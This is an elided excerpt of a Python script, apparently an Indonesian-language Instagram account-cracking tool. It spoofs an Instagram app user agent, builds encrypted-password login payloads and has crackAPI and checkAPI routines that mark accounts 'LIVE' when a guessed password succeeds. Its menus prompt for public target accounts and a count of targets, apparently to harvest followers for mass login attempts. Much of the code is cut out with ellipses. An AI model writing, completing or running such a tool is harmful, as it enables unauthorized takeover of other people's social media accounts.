...
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
USN="Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 Mobile Safari/537.36 Instagram 43.0.0.10.97 Android (26/8.0.0; 640dpi; 1440x2768; samsung; SM-G950F; dreamlte; samsungexynos8895; uk_UA; 105842053)"
...
def banner():
    ...
    cetak(nel(pengembang1, title='𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐏𝐄𝐍𝐆𝐄𝐌𝐁𝐀𝐍𝐆 '))
...
[{H}•{C}]Following      : {following}'''
    ...
    def BUG(self):
        ...
        cetak(nel(bug1, title='𝐑𝐄𝐏𝐎𝐑𝐓 𝐁𝐔𝐆'))
        exit()
...
#					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
                ...
                if "userId" in str(x_jason):
                    ...
                    oi = nel(io, style='green')
                    print('\n')
                    cetak(nel(oi, title='𝐓𝐄𝐌𝐏𝐈𝐗-𝐗𝐃 𝐋𝐈𝐕𝐄'))
...
#					self.crackAPI(user,pas)
    ...
    def checkAPI(self,user,pw):
        try:
            ...
            if "userId" in x.text:
                ...
                oi = nel(io, style='green')
                print('\n')
                cetak(nel(oi, title='𝐓𝐄𝐌𝐏𝐈𝐊-𝐗𝐃 𝐋𝐈𝐕𝐄'))
    ...
    def menu(self):
        ...
        if c=='':
            ...
            pr='# 𝐏𝐀𝐒𝐓𝐈𝐊𝐀𝐍 𝐓𝐀𝐑𝐆𝐄𝐓 𝐁𝐄𝐑𝐒𝐈𝐅𝐀𝐓 𝐏𝐔𝐁𝐋𝐈𝐊'
...
def lisensi():
    ...
    res=ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIyMDI5OTUxNyIsIlRodThKUEM4SUZCbURjMURpMmg4azNzTWR6WGVOSFJOL0x3T1VSVFAiXQ==&ProductId=15502&Key='+lisensikuni[0]).json()
...
def masal(self):
            try:
                menudump.append('pengikut')
                mas='# 𝐓𝐚𝐫𝐠𝐞𝐭 𝐡𝐚𝐫𝐮𝐬 𝐛𝐞𝐫𝐬𝐢𝐟𝐚𝐭 𝐩𝐮𝐛𝐥𝐢𝐤 𝐣𝐚𝐧𝐠𝐚𝐧 𝐩𝐫𝐢𝐯𝐚𝐭'
                mas1=mark(mas,style='red')
                sol().print(mas1)
                m=int(input(f'\n{H}[?{H}] Masukan jumlah target: {N}'))
            except:m=1
